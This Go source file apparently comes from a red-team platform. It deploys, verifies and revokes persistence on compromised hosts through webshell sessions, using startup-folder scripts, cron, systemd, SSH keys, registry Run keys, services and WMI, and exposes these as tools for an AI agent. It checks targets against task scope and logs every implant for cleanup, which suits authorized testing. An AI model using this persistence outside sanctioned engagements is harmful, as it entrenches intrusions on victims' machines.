		return intranetPersistPlan{}, err
	}
	base, err := normalizeWinArtifactName(in.Name, "jingwei")
	if err != nil {
		return intranetPersistPlan{}, err
	}
	scriptName := base + "-" + token + ".cmd"
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "startup-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "当前用户启动文件夹 " + scriptName + "：" + truncateText(command, 200)
	}
	pathExpr := "$p=Join-Path $env:APPDATA " + intranetPSQuote(`Microsoft\Windows\Start Menu\Programs\Startup\`+scriptName) + "\n"
	deployScript := "$ErrorActionPreference='Stop'\n" + pathExpr +
		"$c=\"@echo off`r`n\" + " + intranetPSQuote(command) + " + \"`r`n\"\n" +
		"Set-Content -LiteralPath $p -Value $c -Encoding Ascii -Force\n" +
		"if (-not (Test-Path -LiteralPath $p)) { throw 'startup file missing' }\n" +
		"Write-Output " + intranetPSQuote(intranetArtifactOK) + "\n"
	revokeScript := "$ErrorActionPreference='SilentlyContinue'\n" + pathExpr +
		"Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue\n" +
		"Write-Output " + intranetPSQuote(intranetArtifactOK) + "\n"
	verifyScript := "$ErrorActionPreference='SilentlyContinue'\n" + pathExpr +
		"if (Test-Path -LiteralPath $p) { Write-Output " + intranetPSQuote(intranetArtifactPresent) +
		" } else { Write-Output " + intranetPSQuote(intranetArtifactGone) + " }\n"
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactStartup,
		Name:        name,
		Path:        "startup:" + scriptName,
		Description: desc,
		Deploy:      intranetWindowsPSScript(deployScript),
		Revoke:      intranetWindowsPSScript(revokeScript),
		Verify:      intranetWindowsPSScript(verifyScript),
		Metadata: map[string]any{
			"token": token, "script_name": scriptName,
			"script_path": `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` + scriptName,
			"command":     command,
		},
	}, nil
}

// intranetLoginShellWarn prints a marker when the account cannot produce an
// interactive session anyway. Stock Ubuntu runs www-data with /usr/sbin/nologin
// and an unwritable HOME: the authorized_keys line and the profile line land
// (or fail) exactly as written, but they buy no access, so a deploy that reports
// success would otherwise overstate what the foothold is worth.
func intranetLoginShellWarn(user string) string {
	who := `"$(id -un)"`
	if strings.TrimSpace(user) != "" {
		who = shQuote(strings.TrimSpace(user))
	}
	return `case "$(getent passwd ` + who + ` 2>/dev/null | cut -d: -f7)" in ` +
		`*nologin|*/false|/dev/null) echo ` + intranetWarnNoLoginShell + `;; esac`
}

func buildIntranetPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	switch strings.ToLower(strings.TrimSpace(in.Kind)) {
	case db.IntranetArtifactCron:
		return buildCronPersistPlan(in)
	case db.IntranetArtifactSystemd:
		return buildSystemdPersistPlan(in)
	case db.IntranetArtifactUserSystemd:
		return buildUserSystemdPersistPlan(in)
	case db.IntranetArtifactAt:
		return buildAtPersistPlan(in)
	case db.IntranetArtifactProfile:
		return buildProfilePersistPlan(in)
	case db.IntranetArtifactSSHKey:
		return buildSSHKeyPersistPlan(in)
	case db.IntranetArtifactSchtasks:
		return buildSchtasksPersistPlan(in)
	case db.IntranetArtifactRegistry:
		return buildRegistryPersistPlan(in)
	case db.IntranetArtifactService:
		return buildServicePersistPlan(in)
	case db.IntranetArtifactWMI:
		return buildWMIPersistPlan(in)
	case db.IntranetArtifactStartup:
		return buildStartupPersistPlan(in)
	}
	return intranetPersistPlan{}, errors.New("kind 必须是 cron/systemd/user_systemd/at/profile/ssh_key（POSIX）或 schtasks/registry/service/wmi/startup（Windows）")
}

// intranetPersistKindForOS rejects modules that cannot work on the target
// shell family; the caller only gets here after OS detection, so a POSIX
// fallback on a Windows host surfaces as a clear kind error.
func intranetPersistKindForOS(kind, osKind string) error {
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case db.IntranetArtifactCron, db.IntranetArtifactSystemd, db.IntranetArtifactUserSystemd,
		db.IntranetArtifactAt, db.IntranetArtifactProfile, db.IntranetArtifactSSHKey:
		if osKind == intranetOSWindows {
			return errors.New("目标为 Windows，POSIX 模块不可用；可用 kind: schtasks/registry/service/wmi/startup")
		}
	case db.IntranetArtifactSchtasks, db.IntranetArtifactRegistry, db.IntranetArtifactService,
		db.IntranetArtifactWMI, db.IntranetArtifactStartup:
		if osKind != intranetOSWindows {
			return errors.New("schtasks/registry/service/wmi/startup 仅用于 Windows 会话（当前 OS 判定为 POSIX；若目标实为 Windows，请先执行一次命令或 recon 完成 OS 探测）")
		}
	default:
		return errors.New("kind 必须是 cron/systemd/user_systemd/at/profile/ssh_key（POSIX）或 schtasks/registry/service/wmi/startup（Windows）")
	}
	return nil
}

func intranetArtifactSessionHost(sess *db.IntranetSession) string {
	if sess == nil {
		return ""
	}
	if host := intranetHost(sess.Host); host != "" {
		return host
	}
	return intranetHost(sess.WebshellURL)
}

func intranetArtifactSessionTask(sess *db.IntranetSession, fallback int64) int64 {
	if sess != nil && sess.TaskID != nil && *sess.TaskID > 0 {
		return *sess.TaskID
	}
	return fallback
}

const (
	intranetArtifactMinTTL = time.Minute
	intranetArtifactMaxTTL = 30 * 24 * time.Hour
)

// intranetArtifactFingerprint identifies "the same module on the same host".
// It deliberately ignores the per-deploy random token and session, so a repeat
// deploy of the same kind/host/parameters is recognized as idempotent.
func intranetArtifactFingerprint(kind, host, name, schedule, command, publicKey, user string) string {
	h := sha256.New()
	for _, part := range []string{
		strings.ToLower(strings.TrimSpace(kind)),
		strings.ToLower(strings.TrimSpace(host)),
		strings.TrimSpace(name), strings.TrimSpace(schedule), strings.TrimSpace(command),
		strings.TrimSpace(publicKey), strings.TrimSpace(user),
	} {
		h.Write([]byte(part))
		h.Write([]byte{0})
	}
	return hex.EncodeToString(h.Sum(nil))
}

func intranetArtifactExpiry(ttlSeconds int64) (*time.Time, error) {
	if ttlSeconds <= 0 {
		return nil, nil
	}
	ttl := time.Duration(ttlSeconds) * time.Second
	if ttl < intranetArtifactMinTTL || ttl > intranetArtifactMaxTTL {
		return nil, errors.New("ttl_seconds 需在 60 到 2592000（30 天）之间")
	}
	expires := time.Now().Add(ttl)
	return &expires, nil
}

func intranetArtifactEvidence(action string, run, verify intranetExecOutcome) string {
	var b strings.Builder
	if strings.TrimSpace(run.Output) != "" {
		b.WriteString("【" + action + "】\n" + truncateIntranetOutput(strings.TrimSpace(run.Output), 2000))
	} else if run.IsError && run.Note == "" {
		// systemctl 之类的命令失败时一个字都不说：不留一行退出码，台账里就是一条
		// 空白证据，读者无法判断目标上到底发生了什么。
		b.WriteString("【" + action + "】目标无输出，退出码 " + strconv.Itoa(run.ExitCode))
	}
	if run.Note != "" {
		b.WriteString("\n【" + action + "说明】" + run.Note)
	}
	if strings.TrimSpace(verify.Output) != "" {
		b.WriteString("\n【验证】\n" + truncateIntranetOutput(strings.TrimSpace(verify.Output), 1000))
	}
	return truncateIntranetOutput(strings.TrimSpace(b.String()), 4000)
}

// intranetPersist deploys one standard persistence module through a session and
// always records the artifact (even a failed deploy can leave partial files).
// A repeat deploy with the same fingerprint reuses the still-present artifact
// instead of planting a second copy; reused reports that decision.
func (s *Server) intranetPersist(ctx context.Context, pg *db.DB, in intranetPersistInput) (*db.IntranetArtifact, intranetExecOutcome, intranetExecOutcome, bool, error) {
	deployOut := intranetExecOutcome{ExitCode: -1}
	verifyOut := intranetExecOutcome{ExitCode: -1}
	sess, err := s.intranetSession(pg, in.SessionID)
	if err != nil {
		return nil, deployOut, verifyOut, false, err
	}
	if err := intranetPersistKindForOS(in.Kind, s.intranetOS(ctx, pg, sess)); err != nil {
		return nil, deployOut, verifyOut, false, err
	}
	plan, err := buildIntranetPersistPlan(in)
	if err != nil {
		return nil, deployOut, verifyOut, false, err
	}
	taskID := intranetArtifactSessionTask(sess, in.TaskID)
	if msg := intranetTaskGuard(pg, taskID); msg != "" {
		return nil, deployOut, verifyOut, false, errors.New(msg)
	}
	host := intranetArtifactSessionHost(sess)
	if reason, allowed := s.intranetTargetAllowed(pg, taskID, host); !allowed {
		return nil, deployOut, verifyOut, false, errors.New(reason)
	}
	expiresAt, err := intranetArtifactExpiry(in.TTLSeconds)
	if err != nil {
		return nil, deployOut, verifyOut, false, err
	}
	fingerprint := intranetArtifactFingerprint(in.Kind, host, in.Name, in.Schedule, in.Command, in.PublicKey, in.User)
	if existing, ferr := pg.FindActiveIntranetArtifactByFingerprint(fingerprint); ferr == nil {
		// The ledger says this module is already deployed. Trust only a live
		// verification: present -> reuse, gone -> retire the stale row, anything
		// else -> stop rather than risk a duplicate.
		verifyOut = s.intranetExec(ctx, pg, sess, existing.VerifyCommand, intranetVerifyTimeout)
		switch {
		case strings.Contains(verifyOut.Output, intranetArtifactPresent):
			_, _ = pg.UpdateIntranetArtifactEvidence(existing.ID,
				"幂等复用：同指纹落地物仍在位（会话 #"+strconv.FormatInt(sess.ID, 10)+"）")
			if fresh, gerr := pg.GetIntranetArtifact(existing.ID); gerr == nil {
				return fresh, deployOut, verifyOut, true, nil
			}
			return existing, deployOut, verifyOut, true, nil
		case strings.Contains(verifyOut.Output, intranetArtifactGone):
			if _, rerr := pg.MarkIntranetArtifactRevoked(existing.ID,
				"同指纹重装前验证痕迹已消失，已标记为撤销"); rerr != nil {
				return nil, deployOut, verifyOut, false, rerr
			}
		default:
			return nil, deployOut, verifyOut, false, fmt.Errorf(
				"已有同指纹落地物 #%d，但验证未返回明确标记；请先撤销该落地物后重试", existing.ID)
		}
	} else if !errors.Is(ferr, db.ErrIntranetArtifactNotFound) {
		return nil, deployOut, verifyOut, false, ferr
	}

	deployOut = s.intranetExec(ctx, pg, sess, plan.Deploy, intranetPersistTimeout)
	deployed := !deployOut.IsError && strings.Contains(deployOut.Output, intranetArtifactOK)
	if deployed {
		verifyOut = s.intranetExec(ctx, pg, sess, plan.Verify, intranetVerifyTimeout)
		deployed = !verifyOut.IsError && strings.Contains(verifyOut.Output, intranetArtifactPresent)
	}
	artifact, aerr := pg.AddIntranetArtifact(db.IntranetArtifactInput{
		TaskID: taskID, SessionID: sess.ID, Host: host, Kind: plan.Kind, Name: plan.Name,
		Path: plan.Path, Description: plan.Description, DeployCommand: plan.Deploy,
		RevokeCommand: plan.Revoke, VerifyCommand: plan.Verify, Fingerprint: fingerprint,
		Evidence: intranetArtifactEvidence("部署", deployOut, verifyOut), Metadata: plan.Metadata,
		ExpiresAt: expiresAt,
	})
	if errors.Is(aerr, db.ErrIntranetArtifactDuplicate) {
		// A concurrent deploy won the unique index. Reuse only if its verification
		// says the artifact is present; otherwise surface the conflict.
		existing, ferr := pg.FindActiveIntranetArtifactByFingerprint(fingerprint)
		if ferr == nil {
			check := s.intranetExec(ctx, pg, sess, existing.VerifyCommand, intranetVerifyTimeout)
			if strings.Contains(check.Output, intranetArtifactPresent) {
				_, _ = pg.UpdateIntranetArtifactEvidence(existing.ID, "并发部署检测到同指纹落地物，复用现有记录")
				if fresh, gerr := pg.GetIntranetArtifact(existing.ID); gerr == nil {
					return fresh, deployOut, check, true, nil
				}
				return existing, deployOut, check, true, nil
			}
		}
		return nil, deployOut, verifyOut, false, errors.New("检测到并发部署的同指纹落地物，但无法确认其状态；请刷新台账后重试")
	}
	if aerr != nil {
		return nil, deployOut, verifyOut, false, errors.New("部署命令已执行，但登记落地物台账失败: " + aerr.Error())
	}
	if !deployed {
		keptActive, retire := s.intranetRetireFailedDeploy(ctx, pg, sess, artifact)
		status := "已置为 revoked"
		if keptActive {
			status = "保持 active"
		}
		return artifact, deployOut, verifyOut, false, errors.New("部署未通过验证（" +
			intranetPersistFailureReason(deployOut, verifyOut) + "）；台账 #" +
			strconv.FormatInt(artifact.ID, 10) + " " + status + "：" + retire)
	}
	return artifact, deployOut, verifyOut, false, nil
}

// intranetRetireFailedDeploy settles what a failed deploy actually left behind. The
// ledger row exists by now, and letting it stay "active" for something that never
// landed makes the ledger lie: evacuation spends a revoke on thin air, and the caller
// believes a foothold exists. Confirm gone -> revoked, confirm present -> stay active
// (the deploy only failed to print its marker), unclear -> run the recorded revoke and
// let its own verification decide.
func (s *Server) intranetRetireFailedDeploy(ctx context.Context, pg *db.DB, sess *db.IntranetSession, artifact *db.IntranetArtifact) (bool, string) {
	if artifact == nil {
		return false, "没有台账记录可回收"
	}
	base := strings.TrimSpace(artifact.Evidence)
	if cmd := strings.TrimSpace(artifact.VerifyCommand); cmd != "" {
		check := s.intranetExec(ctx, pg, sess, cmd, intranetVerifyTimeout)
		detail := "【部署失败复核】" + truncateIntranetOutput(displayOr(strings.TrimSpace(check.Output), "复核无输出"), 1000)
		switch {
		case strings.Contains(check.Output, intranetArtifactGone):
			if _, err := pg.MarkIntranetArtifactRevoked(artifact.ID, strings.TrimSpace(base+"\n"+detail)); err != nil {
				return true, "复核确认目标上无痕迹，但台账置 revoked 失败：" + err.Error()
			}
			return false, "复核确认目标上无痕迹，登记后立即撤销"
		case strings.Contains(check.Output, intranetArtifactPresent):
			_, _ = pg.UpdateIntranetArtifactEvidence(artifact.ID, strings.TrimSpace(base+"\n"+detail))
			return true, "复核确认痕迹在位（只是部署命令没打出成功标记），按实际状态保持 active，撤离时会撤销"
		}
		if _, err := pg.UpdateIntranetArtifactEvidence(artifact.ID, strings.TrimSpace(base+"\n"+detail)); err == nil {
			if fresh, gerr := pg.GetIntranetArtifact(artifact.ID); gerr == nil {
				artifact = fresh
				base = strings.TrimSpace(artifact.Evidence)
			}
		}
	}
	_, _, vout, ok, rerr := s.intranetRevokeArtifact(ctx, pg, artifact.ID, sess.ID)
	// 撤销路径会用撤销证据覆盖台账里的部署证据：失败回收必须两段都留得下，否则读台账
	// 的人看不到目标当初说过什么，只剩一条"撤销失败"。
	if fresh, gerr := pg.GetIntranetArtifact(artifact.ID); gerr == nil && base != "" && !strings.Contains(fresh.Evidence, base) {
		combined := truncateIntranetOutput(strings.TrimSpace(base+"\n"+fresh.Evidence), 4000)
		if ok {
			_, _ = pg.MarkIntranetArtifactRevoked(artifact.ID, combined)
		} else {
			_, _ = pg.UpdateIntranetArtifactEvidence(artifact.ID, combined)
		}
	}
	if ok {
		return false, "复核无定论，已按登记的撤销命令清理并确认 Gone"
	}
	why := strings.TrimSpace(displayOr(vout.Output, vout.Note))
	if why == "" {
		if rerr != nil {
			why = rerr.Error()
		} else {
			why = "撤销后复核仍未确认清理"
		}
	}
	return true, "复核无定论，已尽力执行撤销但未确认清理，保持 active 由撤离流程继续处理：" +
		truncateIntranetOutput(why, 300)
}

// intranetPersistFailureReason quotes what the target actually said. The ledger
// evidence is one click away for a human, but the caller of this tool only sees
// this string — "部署未通过验证" alone leaves an agent unable to tell a
// permission problem (switch module) from a transient one (retry).
func intranetPersistFailureReason(run, verify intranetExecOutcome) string {
	for _, out := range []intranetExecOutcome{verify, run} {
		if line := strings.TrimSpace(out.Output); line != "" {
			if i := strings.IndexByte(line, '\n'); i >= 0 {
				line = line[:i]
			}
			return "目标输出：" + truncateIntranetOutput(line, 200)
		}
		if note := strings.TrimSpace(out.Note); note != "" {
			return note
		}
	}
	if run.ExitCode > 0 {
		return "退出码 " + strconv.Itoa(run.ExitCode) + "，目标无输出"
	}
	return "验证未确认落地物在位"
}

// intranetRegisterArtifact records an artifact the operator deployed outside the
// standard modules (e.g. a file fetched with intranet_exec).
func (s *Server) intranetRegisterArtifact(pg *db.DB, in intranetArtifactRegisterInput) (*db.IntranetArtifact, error) {
	if strings.TrimSpace(in.RevokeCommand) == "" {
		return nil, errors.New("revoke_command 不能为空：不能撤销的落地物不允许登记")
	}
	var sess *db.IntranetSession
	if in.SessionID > 0 {
		var err error
		sess, err = s.intranetSession(pg, in.SessionID)
		if err != nil {
			return nil, err
		}
	}
	host := intranetHost(in.Host)
	if host == "" {
		host = intranetArtifactSessionHost(sess)
	}
	taskID := intranetArtifactSessionTask(sess, in.TaskID)
	kind := strings.ToLower(strings.TrimSpace(in.Kind))
	if kind == "" {
		kind = db.IntranetArtifactOther
	}
	expiresAt, err := intranetArtifactExpiry(in.TTLSeconds)
	if err != nil {
		return nil, err
	}
	return pg.AddIntranetArtifact(db.IntranetArtifactInput{
		TaskID: taskID, SessionID: in.SessionID, Host: host, Kind: kind, Name: in.Name,
		Path: in.Path, Description: in.Description, RevokeCommand: in.RevokeCommand,
		VerifyCommand: in.VerifyCommand, Metadata: in.Metadata, ExpiresAt: expiresAt,
	})
}

func intranetArtifactRevokeFailed(art *db.IntranetArtifact, out, verify intranetExecOutcome) error {
	detail := strings.TrimSpace(out.Output)
	if detail == "" {
		detail = strings.TrimSpace(out.Note)
	}
	if v := strings.TrimSpace(verify.Output); v != "" {
		detail += "；验证: " + v
	}
	if detail == "" {
		detail = "撤销命令没有输出"
	}
	return fmt.Errorf("落地物 #%d 撤销未通过验证: %s", art.ID, truncateIntranetOutput(detail, 300))
}

// intranetRevokeArtifact runs the ledger's revoke command and verifies the
// artifact is gone. A closed session is still usable for cleanup: the webshell
// behind it may be alive and is often the only path to remove the artifact.
func (s *Server) intranetRevokeArtifact(ctx context.Context, pg *db.DB, id, sessionID int64) (*db.IntranetArtifact, intranetExecOutcome, intranetExecOutcome, bool, error) {
	empty := intranetExecOutcome{ExitCode: -1}
	art, err := pg.GetIntranetArtifact(id)
	if err != nil {
		return nil, empty, empty, false, errors.New("落地物不存在")
	}
	if art.Status == db.IntranetArtifactRevoked {
		return art, empty, empty, true, nil
	}
	sid := sessionID
	if sid <= 0 && art.SessionID != nil {
		sid = *art.SessionID
	}
	ch, rerr := s.intranetArtifactRunner(ctx, pg, art, sid)
	if rerr != nil {
		return art, empty, empty, false, rerr
	}
	run := ch.Run
	revokeCmd, verifyCmd := art.RevokeCommand, strings.TrimSpace(art.VerifyCommand)
	if ch.Self && verifyCmd != "" {
		// 通道正是被撤销的对象（prepend 壳）：撤销一旦生效，这条通道连复核命令
		// 都发不出去。把清理与复核合成一条命令，在同一次执行里看文件系统实态。
		revokeCmd = revokeCmd + "; " + verifyCmd
		verifyCmd = ""
	}
	revokeOut := run(revokeCmd, intranetPersistTimeout)
	revokeFailed := strings.Contains(revokeOut.Output, intranetArtifactFailed)
	ok := !revokeOut.IsError && !revokeFailed
	verifyOut := intranetExecOutcome{ExitCode: -1}
	if verifyCmd != "" {
		verifyOut = run(verifyCmd, intranetVerifyTimeout)
		// 验证命令是"痕迹已消失"的最终依据：撤销命令可能不幂等（对象已被
		// 外部删除时返回非零），不能因此把已清理的落地物判为撤销失败。
		ok = !revokeFailed && strings.Contains(verifyOut.Output, intranetArtifactGone)
	} else if ch.Self {
		verifyOut = revokeOut
		ok = !revokeFailed && strings.Contains(revokeOut.Output, intranetArtifactGone)
	}
	evidence := intranetArtifactEvidence("撤销", revokeOut, verifyOut)
	if ok {
		updated, merr := pg.MarkIntranetArtifactRevoked(id, evidence)
		if merr != nil {
			return art, revokeOut, verifyOut, false, merr
		}
		return updated, revokeOut, verifyOut, true, nil
	}
	if _, uerr := pg.UpdateIntranetArtifactEvidence(id, evidence); uerr == nil {
		if fresh, gerr := pg.GetIntranetArtifact(id); gerr == nil {
			art = fresh
		}
	}
	return art, revokeOut, verifyOut, false, intranetArtifactRevokeFailed(art, revokeOut, verifyOut)
}

// ---------------------------------------------------------------------------
// HTTP API
// ---------------------------------------------------------------------------

func (s *Server) listIntranetArtifacts(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	q := r.URL.Query()
	taskID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("task_id")), 10, 64)
	sessionID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("session_id")), 10, 64)
	rows, total, err := pg.ListIntranetArtifacts(db.IntranetArtifactFilter{
		TaskID: taskID, SessionID: sessionID, Host: q.Get("host"), Kind: q.Get("kind"),
		Status: q.Get("status"), Limit: atoiDefault(q.Get("limit"), 100), Offset: atoiDefault(q.Get("offset"), 0),
	})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"artifacts": rows, "total": total})
}

func (s *Server) registerIntranetArtifact(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetArtifactRegisterInput
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	art, err := s.intranetRegisterArtifact(pg, req)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"artifact": art})
}

func (s *Server) revokeIntranetArtifact(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的落地物 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		SessionID int64 `json:"session_id"`
	}
	_ = decode(r, &req)
	pg := s.pg(w)
	if pg == nil {
		return
	}
	art, out, verify, revoked, err := s.intranetRevokeArtifact(r.Context(), pg, id, req.SessionID)
	if err != nil && art == nil {
		writeErr(w, 404, err.Error())
		return
	}
	code := 200
	if !revoked {
		code = 400
	}
	body := map[string]any{
		"artifact": art, "result": out, "verify": verify, "revoked": revoked,
	}
	if err != nil {
		body["error"] = err.Error()
	}
	writeJSON(w, code, body)
}

func (s *Server) persistIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetPersistInput
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	req.SessionID = id
	pg := s.pg(w)
	if pg == nil {
		return
	}
	art, out, verify, reused, err := s.intranetPersist(r.Context(), pg, req)
	if art == nil && err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	code := 200
	body := map[string]any{
		"artifact": art, "result": out, "verify": verify, "deployed": err == nil, "reused": reused,
	}
	if err != nil {
		code = 400
		body["error"] = err.Error()
	}
	writeJSON(w, code, body)
}

// ---------------------------------------------------------------------------
// LLM 工具
// ---------------------------------------------------------------------------

func (s *Server) toolIntranetPersist() actool.CoreTool {
	return wrTool("intranet_persist",
		"部署标准权限维持模块并自动登记可撤销落地物：POSIX 会话用 kind=cron（计划任务）、systemd（系统级服务）、user_systemd（用户级服务）、at（一次性延时任务）、profile（.profile 登录启动项）、ssh_key（authorized_keys 公钥）；Windows 会话用 kind=schtasks（计划任务）、registry（HKCU Run）、service（自动启动服务，需管理员）、wmi（WMI 永久事件订阅，需管理员）、startup（当前用户启动文件夹脚本）。部署前会做任务范围检查；部署后立即用验证命令确认，失败也会登记台账供撤离时清理。同主机同参数重复部署会幂等复用仍在位的落地物；ttl_seconds 到期后后台自动撤销。不要用它执行一次性命令；每个模块都会留下可审计的撤销命令。",
		objSchema(map[string]any{
			"session_id":  intranetIntParam("会话 ID（必填）"),
			"kind":        strParam("POSIX: cron/systemd/user_systemd/at/profile/ssh_key；Windows: schtasks/registry/service/wmi/startup（必填，需与目标 OS 匹配）"),
			"name":        strParam("模块名称（可选，用作幂等指纹的一部分；Windows 任务/键名会自动追加随机后缀）"),
			"schedule":    strParam("触发方式：cron 用 5 段表达式或 @reboot；schtasks 用 onlogon/onstart/minute:N；at 用 now + 10 minutes/14:30；profile 可填 .profile/.bashrc（可选）"),
			"command":     strParam("要维持执行的命令（ssh_key 之外必填）"),
			"public_key":  strParam("SSH 公钥内容（kind=ssh_key 必填，如 ssh-ed25519 AAAA...）"),
			"user":        strParam("POSIX 目标账号（可选，默认当前用户；用于 ssh_key/user_systemd/at/profile）"),
			"ttl_seconds": intranetIntParam("自动撤销 TTL 秒数（可选，60-2592000；到期后后台撤销并验证）"),
			"description": strParam("落地物说明（可选）"),
			"task_id":     intranetIntParam("归属任务 ID（可选，默认会话归属/当前任务）"),
		}, "session_id", "kind"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a intranetPersistInput
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数格式错误"), nil
			}
			if a.SessionID <= 0 {
				return actool.Errorf("session_id 必填"), nil
			}
			if a.TaskID <= 0 {
				a.TaskID = intranetCtxTaskID(ctx)
			}
			pg, err := s.intranetToolPG()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			art, out, verify, reused, perr := s.intranetPersist(ctx, pg, a)
			res := map[string]any{"artifact": art, "result": out, "verify": verify, "deployed": perr == nil, "reused": reused}
			if perr != nil {
				res["error"] = perr.Error()
			}
			return jsonResult(res)
		})
}

func (s *Server) toolIntranetArtifacts() actool.CoreTool {
	return roTool("intranet_artifacts",
		"查询内网落地物台账（目标侧文件/计划任务/systemd 服务/SSH 公钥）。返回 kind/path/status/revoke_command/verify_command 等；status=active 表示尚未撤销。它是撤离清理的依据：不要删除已被撤销的记录，也不要遗漏 active 记录。",
		objSchema(map[string]any{
			"task_id":    intranetIntParam("按归属任务过滤（可选）"),
			"session_id": intranetIntParam("按会话过滤（可选）"),
			"host":       strParam("按目标主机过滤（可选）"),
			"kind":       strParam("file/cron/systemd/user_systemd/at/profile/ssh_key/schtasks/registry/service/wmi/startup/other（可选）"),
			"status":     strParam("active / revoked（可选）"),
			"limit":      intranetIntParam("最多返回条数，默认 100，最大 500"),
			"offset":     intranetIntParam("偏移（可选）"),
		}),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				TaskID    int64  `json:"task_id"`
				SessionID int64  `json:"session_id"`
				Host      string `json:"host"`
				Kind      string `json:"kind"`
				Status    string `json:"status"`
				Limit     int    `json:"limit"`
				Offset    int    `json:"offset"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数格式错误"), nil
			}
			pg, err := s.intranetToolPG()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			rows, total, err := pg.ListIntranetArtifacts(db.IntranetArtifactFilter{
				TaskID: a.TaskID, SessionID: a.SessionID, Host: a.Host, Kind: a.Kind,
				Status: a.Status, Limit: a.Limit, Offset: a.Offset,
			})
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			return jsonResult(map[string]any{"artifacts": rows, "total": total})
		})
}

func (s *Server) toolIntranetArtifactRegister() actool.CoreTool {
	return wrTool("intranet_artifact_register",
		"登记一个手工部署的落地物（例如用 intranet_exec 下载到目标的工具、写入的脚本），必须提供 revoke_command。verify_command 建议按约定打印 JW_ARTIFACT_PRESENT / JW_ARTIFACT_GONE，撤离时据此确认痕迹已消失。台账是撤离清理的唯一依据：凡是留在目标上的东西都要登记。",
		objSchema(map[string]any{
			"session_id":     intranetIntParam("落地物所在会话（建议提供，撤销命令经它执行）"),
			"task_id":        intranetIntParam("归属任务 ID（可选，默认会话归属/当前任务）"),
			"host":           strParam("目标主机（可选，默认取会话主机）"),
			"kind":           strParam("file/cron/systemd/user_systemd/at/profile/ssh_key/schtasks/registry/service/wmi/startup/other（可选，默认 other）"),
			"name":           strParam("名称（可选）"),
			"path":           strParam("目标路径/标识（可选）"),
			"description":    strParam("说明（可选）"),
			"ttl_seconds":    intranetIntParam("自动撤销 TTL 秒数（可选，60-2592000）"),
			"revoke_command": strParam("撤销命令（必填）"),
			"verify_command": strParam("验证命令（可选，撤销后应输出 JW_ARTIFACT_GONE）"),
			"metadata":       map[string]any{"type": "object", "description": "附加元数据（可选）"},
		}, "revoke_command"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a intranetArtifactRegisterInput
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数格式错误"), nil
			}
			if strings.TrimSpace(a.RevokeCommand) == "" {
				return actool.Errorf("revoke_command 必填"), nil
			}
			if a.TaskID <= 0 {
				a.TaskID = intranetCtxTaskID(ctx)
			}
			pg, err := s.intranetToolPG()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			art, err := s.intranetRegisterArtifact(pg, a)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			return jsonResult(map[string]any{"artifact": art})
		})
}

func (s *Server) toolIntranetArtifactRevoke() actool.CoreTool {
	return wrTool("intranet_artifact_revoke",
		"撤销一条落地物台账记录：执行记录的 revoke_command，再用 verify_command 确认痕迹消失。成功标记 revoked；失败保持 active 并返回证据，可重试。session_id 省略时使用台账绑定的会话（已关闭的会话仍可用于清理）。",
		objSchema(map[string]any{
			"artifact_id": intranetIntParam("落地物 ID（必填）"),
			"session_id":  intranetIntParam("用于执行撤销的会话 ID（可选，默认台账绑定会话）"),
		}, "artifact_id"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				ArtifactID int64 `json:"artifact_id"`
				SessionID  int64 `json:"session_id"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数格式错误"), nil
			}
			if a.ArtifactID <= 0 {
				return actool.Errorf("artifact_id 必填"), nil
			}
			pg, err := s.intranetToolPG()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			art, out, verify, revoked, rerr := s.intranetRevokeArtifact(ctx, pg, a.ArtifactID, a.SessionID)
			res := map[string]any{"artifact": art, "result": out, "verify": verify, "revoked": revoked}
			if rerr != nil {
				res["error"] = rerr.Error()
			}
			return jsonResult(res)
		})
}
